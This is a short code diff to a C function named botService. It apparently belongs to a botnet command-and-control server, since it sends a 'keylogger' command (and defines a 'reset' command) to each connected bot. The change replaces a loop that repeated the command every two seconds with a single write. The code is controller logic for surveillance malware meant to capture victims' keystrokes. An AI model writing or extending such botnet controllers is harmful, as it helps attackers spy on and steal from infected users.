@@ -144,12 +144,15 @@ void *botService(void *vargp) {
     */
     bot_t *user = (bot_t *)vargp;
 
-    char command[] = "keylogger";
+    char commands[2][10] = {"keylogger", "reset"};
 
+    /*
     while (1) {
         write(user->fd, command, sizeof(command));
         sleep(2);
     }
+    */
+    write(user->fd, commands[0], sizeof(commands[0]));
     
     return NULL;
 }
